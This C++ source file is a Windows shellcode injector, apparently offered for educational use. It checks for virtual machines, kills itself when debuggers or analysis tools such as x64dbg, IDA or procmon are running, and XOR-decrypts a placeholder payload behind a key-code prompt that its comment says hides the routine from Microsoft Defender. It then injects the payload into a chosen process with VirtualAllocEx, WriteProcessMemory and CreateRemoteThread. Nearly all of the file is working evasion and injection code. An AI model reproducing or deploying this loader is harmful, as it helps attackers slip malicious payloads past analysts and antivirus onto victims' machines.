/*
 * Author: Cyb3rV1c
 * Created: October 2024
 * Description: Shellcode injection program with virtual machine detection,
 *              debugger detection, static analysis tools detection, XOR
 *				decryption, and remote process injection.
 * License: MIT License
 *
 * This code was written by Cyb3rV1c and is a work in progress for cybersecurity
 * educational purposes. Unauthorized use or distribution is not allowed without
 * proper credit.
 */


#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <iostream>
#include <winternl.h>
#include <string>

 //1# - VM DETECTION
BOOL IsVenvByHardwareCheck() {

	SYSTEM_INFO SysInfo = { 0 };
	MEMORYSTATUSEX MemStatus;
	MemStatus.dwLength = sizeof(MEMORYSTATUSEX);
	HKEY hKey = NULL;
	DWORD dwUsbNumber = 0;

	// CPU CHECK
	GetSystemInfo(&SysInfo);

	// Less than 2 processors
	if (SysInfo.dwNumberOfProcessors < 4) {
		return TRUE;
	}

	// RAM CHECK
	if (!GlobalMemoryStatusEx(&MemStatus)) {
		printf("\n\t[!] GlobalMemoryStatusEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Less than 2 gb of ram
	if ((DWORD)MemStatus.ullTotalPhys <= (DWORD)(2 * 1073741824)) {
		return TRUE;
	}
	return FALSE;
}
//#2 - DEBUGGER DETECTION
#define LISTARRAY_SIZE 6 // Number of elements inside the array

const WCHAR* g_DebuggersCheck[LISTARRAY_SIZE] = {
		L"x64dbg.exe",
		L"x32dbg.exe",
		L"ida.exe",                   // < ---- Add more, just make sure to change LISTARRAY_SIZE
		L"ida64.exe",
		L"VsDebugConsole.exe",
		L"msvsmon.exe"
};

BOOL BLlistProcCheck() {

	HANDLE hSnapShot = NULL;
	PROCESSENTRY32W ProcEntry;
	ProcEntry.dwSize = sizeof(PROCESSENTRY32W);
	BOOL bSTATE = FALSE;


	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	if (!Process32FirstW(hSnapShot, &ProcEntry)) {
		printf("\t[!] Process32FirstW Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {
		// Loops through the 'g_DebuggersCheck' array and comparing each element to the 
		// Current process name captured from the snapshot 
		for (int i = 0; i < LISTARRAY_SIZE; i++) {
			if (wcscmp(ProcEntry.szExeFile, g_DebuggersCheck[i]) == 0) {
				// Debugger detected	
				wprintf(L"[+] Debugger detected.\n \t [i] Detected this tool : \"%s\" Of Pid : %d \n", ProcEntry.szExeFile, ProcEntry.th32ProcessID);
				bSTATE = TRUE;
				break;
			}
		}

	} while (Process32Next(hSnapShot, &ProcEntry));


_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	return bSTATE;
}

//#3 - STATIC ANALYSIS TOOLS DETECTION
#define LISTARRAY_SIZE_2 3 // Number of elements inside the array

const WCHAR* g_StaticCheck[LISTARRAY_SIZE_2] = {
		L"ProcessHacker.exe",
		L"pestudio.exe",				// < ---- Add more, just make sure to change LISTARRAY_SIZE_2
		L"procmon.exe",
};
BOOL StaticToolsCheck() {

	HANDLE hSnapShot = NULL;
	PROCESSENTRY32W ProcEntry;
	ProcEntry.dwSize = sizeof(PROCESSENTRY32W);
	BOOL bSTATE = FALSE;

	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	if (!Process32FirstW(hSnapShot, &ProcEntry)) {
		printf("\t[!] Process32FirstW Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {
		// Loops through the 'g_StaticCheck' array and comparing each element to the 
		// Current process name captured from the snapshot 
		for (int i = 0; i < LISTARRAY_SIZE_2; i++) {
			if (wcscmp(ProcEntry.szExeFile, g_StaticCheck[i]) == 0) {
				// Debugger detected	
				wprintf(L"[+] Additional Analysis Tool Detected.\n \t [i] Detected this tool : \"%s\" Of Pid : %d \n", ProcEntry.szExeFile, ProcEntry.th32ProcessID);
				bSTATE = TRUE;
				break;
			}
		}

	} while (Process32Next(hSnapShot, &ProcEntry));


_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	return bSTATE;
}

//#4 XOR-ENC & REMOTE PROCESS INJECTION FUNCTIONS
void xor_encrypt(unsigned char* buf, size_t len, unsigned char key) {
	for (size_t i = 0; i < len; i++) {
		buf[i] ^= key;
	}
}

// Function to get process ID by name
DWORD GetProcessIDByName(const std::wstring& processName) {
	// Take a snapshot of all processes in the system
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return 0;
	}

	PROCESSENTRY32W processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32W);

	// Iterate through all processes
	if (Process32FirstW(hSnapshot, &processEntry)) {
		do {
			// Use lstrcmpiW to make a case-insensitive comparison
			if (lstrcmpiW(processEntry.szExeFile, processName.c_str()) == 0) {
				CloseHandle(hSnapshot);
				return processEntry.th32ProcessID; // Return the process ID
			}
		} while (Process32NextW(hSnapshot, &processEntry));
	}

	CloseHandle(hSnapshot);
	return 0; // Process not found
}


// Function to inject shellcode into a remote process
BOOL InjectShellcode(DWORD processID, unsigned char* shellcode, size_t shellcodeSize) {
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
	if (hProcess == NULL) {
		std::cerr << "[!] Failed to open process. Error: " << GetLastError() << std::endl;
		return FALSE;
	}

	// Allocate memory in the target process
	void* execMemory = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (execMemory == NULL) {
		std::cerr << "[!] Failed to allocate memory in remote process. Error: " << GetLastError() << std::endl;
		CloseHandle(hProcess);
		return FALSE;
	}

	// Write the decrypted shellcode into the allocated memory
	SIZE_T bytesWritten;
	if (!WriteProcessMemory(hProcess, execMemory, shellcode, shellcodeSize, &bytesWritten) || bytesWritten != shellcodeSize) {
		std::cerr << "[!] Failed to write memory in remote process. Error: " << GetLastError() << std::endl;
		VirtualFreeEx(hProcess, execMemory, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return FALSE;
	}

	// Create a remote thread to execute the shellcode
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)execMemory, NULL, 0, NULL);
	if (hThread == NULL) {
		std::cerr << "[!] Failed to create remote thread. Error: " << GetLastError() << std::endl;
		VirtualFreeEx(hProcess, execMemory, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return FALSE;
	}

	// Cleanup
	CloseHandle(hThread);
	CloseHandle(hProcess);
	return TRUE;
}
//#5 MAIN FUNCTION

int wmain(int argc, wchar_t* argv[]) {
	using namespace std;

	cout << R"(
  _______           _______  _       _________ _______  _______ 
(  ____ )|\     /|(  ___  )( (    /|\__   __/(  ___  )(       )
| (    )|| )   ( || (   ) ||  \  ( |   ) (   | (   ) || () () |
| (____)|| (___) || (___) ||   \ | |   | |   | |   | || || || |
|  _____)|  ___  ||  ___  || (\ \) |   | |   | |   | || |(_)| |
| (      | (   ) || (   ) || | \   |   | |   | |   | || |   | |
| )      | )   ( || )   ( || )  \  |   | |   | (___) || )   ( |
|/       |/     \||/     \||/    )_)   )_(   (_______)|/     \|
                                                                  
)";
	printf("Analyzing Environment First:\n \n");
	if (IsVenvByHardwareCheck()) {
		printf("[+] Virtual environment detected.\n \t [i] CPU/RAM Very Low.\n");
		exit(0);
	}
	else {
		printf("[-] No virtual environment detected.\n");
	}

	if (BLlistProcCheck()) {
		exit(0);
	}
	else {
		printf("[-] No debugger detected.\n");
	}

	if (StaticToolsCheck()) {
		exit(0);
	}
	else {
		printf("[-] No Additional Tools detected.\n");
	}

	printf("[i] Fewww! Great, Let's continue!\n");

	unsigned char buf[] = "Add shellcode"; // < ---- ADD YOUR ENCRYPTED SHELLCODE

	size_t len = sizeof(buf) / sizeof(buf[0]);

	// XOR KEY 
	unsigned char key = 0xAB; // < -- INSERT XOR KEY
	const int maxAttempts = 3; // Maximum number of attempts
	int userInput;
	int attempts = 0;

	while (attempts < maxAttempts) {
		printf("[*] Enter code to continue: ");
		scanf("%d", &userInput);
		if (userInput == 2314) {  //< --------- Enter your desired key code (notice : Query Prevents MS Def to detect decryption routine)
			break;
		}
		attempts++;
		printf("[!] Incorrect code. You have %d attempt(s) left.\n", maxAttempts - attempts);
	}

	if (attempts == maxAttempts) {
		printf("[-] Maximum attempts reached. Exiting...\n");
		return 1;
	}

	// XOR DECRYPTION 
	xor_encrypt(buf, len, key);
	printf("[i] Decrypted Shellcode: ");
	for (size_t i = 0; i < len; i++) {
		printf("%02X ", buf[i]);
	}
	printf("\n");

	// Get the target process name from user input
	std::wstring processName;
	std::wcin.ignore();
	std::wcout << L"[?] Enter the process name: ";
	std::getline(std::wcin, processName);
	DWORD targetProcessID = GetProcessIDByName(processName);
	if (targetProcessID == 0) {
		std::wcerr << L"[!] Failed to find the process " << processName << L"\n[i] Make sure it's running." << std::endl;
		return 1;
	}

	// Inject shellcode into the target process
	if (InjectShellcode(targetProcessID, buf, len)) {
		printf("[+] Shellcode injected and executed successfully.\n");
	}
	else {
		printf("[!] Failed to inject and execute shellcode.\n");
	}

	return 0;
}



